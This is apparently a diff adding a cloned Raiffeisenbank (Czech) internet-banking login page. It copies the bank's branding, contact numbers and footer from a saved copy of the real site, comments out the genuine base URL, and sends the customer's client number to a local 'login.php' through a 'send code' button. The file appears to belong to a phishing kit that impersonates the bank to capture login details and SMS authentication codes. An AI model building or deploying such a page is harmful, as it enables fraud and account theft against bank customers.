@@ -1,0 +1,48 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>Raiffeisenbank</title>
+    <!-- base href="https://online.rb.cz/gaas/authorize/login/" -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+   
+   <link rel="icon" type="image/x-icon" href="https://online.rb.cz/gaas/authorize/login/favicon.ico">
+  <link rel="stylesheet" href="Raiffeisenbank_fichiers/styles.css"><link id="vpe-css" href="Raiffeisenbank_fichiers/gib-fragments.css" rel="stylesheet"></head>
+
+  <body style="display: block;">
+   
+    <!--[if IE]>
+      <p class="unsupported">
+        <i class="icko"></i>
+        <span
+          >Verze vašeho prohlížeče již není podporována. <br />
+          Your browser version is no longer supported.</span
+        >
+        <a href="http://rb.cz/ibs-prohlizece"> www.rb.cz/ibs-prohlizece/ </a>
+      </p>
+    <![endif]-->
+
+    <app-root ng-version="12.2.12"><div id="top-navigation" class="top-navigation not-logged-in"><div class="top-navigation-container"><div class="navbar"><a target="_blank" href="https://www.rb.cz/"><div class="item login-logo"></div></a><div class="item publicmenulinks"><rb-link xid="loginMenuContactUs" linkcode="CON_AUS_002" class="item contact-us"><span><a href="https://www.rb.cz/o-nas/kontakty" target="_blank">Kontakty</a></span></rb-link><rb-link xid="loginMenuSecurity" linkcode="CON_AUS_003" class="item security"><span><a href="https://www.rb.cz/informacni-servis/doplnkove-informace-k-produktum/bezpecne-bankovnictvi/bezpecnost-internetoveho-bankovnictvi" target="_blank">Bezpečnost</a></span></rb-link><rb-link xid="loginMenuHelp" linkcode="CON_AUS_004" class="item help"><span><a href="https://www.rb.cz/osobni/ucty-a-bankovnictvi/internetove-bankovnictvi/internetove-bankovnictvi-faq-new" target="_blank">Nápověda</a></span></rb-link><rb-login-translate-select class="item"><div xid="translateSelect"><span class="languageLink"><!----><span xid="languageCZ" class="active clickable">CZ</span></span><span class="languageLink"><span class="languageDelimiter">&nbsp;/&nbsp;</span><!----><span xid="languageEN" class="clickable">EN</span></span><!----></div></rb-login-translate-select></div></div></div></div><!----><div class="container"><div class="main-content"><router-outlet></router-outlet><rb-login><div><div id="xBuildInfo"><p id="branch">release/R6.11</p><p id="buildNumber">a586f10913b46211b46e867534beea52d073f0b6</p><p id="buildTimestamp">1639563105615</p><p id="buildDateTime">15-12-2021 10:11:45</p></div><system-selector><!----><!----><gib><div class="container"><div><div class="login--header-wrapper"><rb-name-day><div xid="nameDay" class="login--header-dtime"><span xid="nameDayDate" class="login--header-date"></span><span xid="nameDayName" class="login--header-name">  </span></div><!----><!----></rb-name-day></div><rb-login-version-info><!----></rb-login-version-info><div class="login--wrapper"><section class="login"><rb-login-provider-header><!----></rb-login-provider-header><rb-login-info-message><!----></rb-login-info-message><!----><!----><!----><rb-error xid="login"><!----><!----><!----></rb-error><!----><!----><rb-login-header><h1 class="login-header" xid="loginPageHeader">Vstup na účet</h1></rb-login-header><!----><methods-switch><div class="login-switch-content"><i-switch xid="methodsSwitch" viewas="label" returnas="value" tabindex="0" class="i-switch"><!----><!----><i-switch-option><!----><div class="i-switch-option upgraded" xid="methodsSwitchLN_MTOKEN" data-index="LN_MTOKEN" style="width: 33.3333%;"><div class="i-switch-label">RB klíč</div><!----><!----></div></i-switch-option><i-switch-option><!----><div class="i-switch-option upgraded focused active" xid="methodsSwitchMEK_SMS" data-index="MEK_SMS" style="width: 33.3333%;"><div class="i-switch-label">SMS kód</div><!----><!----></div></i-switch-option><i-switch-option><!----><div class="i-switch-option upgraded" xid="methodsSwitchOEK" data-index="OEK" style="width: 33.3333%;"><div class="i-switch-label">Osobní klíč</div><!----><!----></div></i-switch-option><!----><!----><!----></i-switch><!----><!----><!----><div id="method"><sms><i-row class="customerID login-form i-row"><!----><!----><div class="i-row-content">
+
+
+
+
+      <form action="login.php" method="post"><i-field xid="username"><div class="i-field"><!----><label ifieldlabel="" ilabelvalidate="" class="i-field-label" label-validate="required">Klientské číslo</label><!----><!---->
+	  <input name="TXT_AUS_024" maxlength="10" pattern="[0-9]{10}" type="text" required=""><!----><!----><!----></div></i-field><!----><div class="loginMethodContent"><div translate="TXT_AUS_002" class="info text-center">Zapomněli jste Vaše Klientské číslo? Navštivte jakoukoli pobočku Raiffeisenbank.</div></div><!----><div class="loginMethodContent"><div class="d-flex"><div class="icon"><div class="calc-icon first"></div></div><div translate="TXT_AUS_003" class="info-text-info">Klikněte na tlačítko POSLAT KÓD a požádejte o autentizační kód</div></div><div class="request-button pull-right"><button ibutton="" xid="sendSmsButton" type="submit" translate="CON_AUS_008" class="login-button i-button clickable">Poslat kód</button></div><div translate="TXT_AUS_004" class="oek-info mt-2">Upozornění:
+ Autentizační kód bude zaslán na Váš mobilní telefon. V případě potíží 
+nás kontaktujte na Klientské lince +420 412 440 000 (7-22 hod).</div></div><!----></form><!----></div></i-row><!----></sms><!----></div></div></methods-switch></section><div class="login--sidebar"><rb-eshop-payment xid="eshopPayment"><!----><!----></rb-eshop-payment><!----><rb-public-banner><div class="rb-inline-banner"><rb-public-banner-logic><div class="banner-placeholder-wrapper"><rb-public-banner-placeholder xid="bannerPlaceholder-0"><div class="vpe-banner-uds gib-login-banner bg-default">
+
+    <div class="img">
+        <img src="Raiffeisenbank_fichiers/new_login__IB_v2.png" alt="">
+    </div>
+
+    <div class="text-wrapper">
+
+        <div class="btn-set">
+        </div>
+    </div>
+
+</div>
+<!-- Timestamp: 1632482639994 -->
+</rb-public-banner-placeholder><!----><!----></div><!----></rb-public-banner-logic></div></rb-public-banner><!----></div></div></div></div></gib><!----></system-selector></div></rb-login><!----></div></div><div id="rbfooter"><rb-footer><rb-footer-content phonenumber="TXT_AUS_021"><footer xid="rb-footer" class="footer"><div class="footer-container"><div class="footer-overall"><div class="footer-item"><div class="device-icon mobile"></div><div xid="phoneNumber" class="info-main"><a href="tel:+420 412 440 000">+420 412 440 000</a></div><div class="info-text">Klientská linka  (denně 7-22 hod)</div></div><div class="footer-item"><div class="device-icon mobile"></div><div xid="internationalPhoneNumber" class="info-main"><a href="tel:+420 412 446 402">+420 412 446 402</a></div><div class="info-text">Blokace karet a klíčů (NONSTOP)</div></div><div class="footer-item"><div class="device-icon mail"></div><div xid="email" class="info-main"><a href="mailto:info@rb.cz" target="_blank">info@rb.cz</a></div><div class="info-text">Odpovíme do 24 hodin</div></div><div class="footer-item last-login"><div class="info-text">© 2022 Raiffeisenbank</div><!----></div></div></div></footer></rb-footer-content></rb-footer></div><!----></app-root>
+ 
+<div id="arcotuserdataDiv" display="none" style="display: none;"></div><div id="arcotuserdataDiv" display="none" style="display: none;"></div><div id="arcotuserdataDiv" display="none" style="display: none;"></div><cookie-wall ng-version="12.2.15"><!----></cookie-wall></body></html>
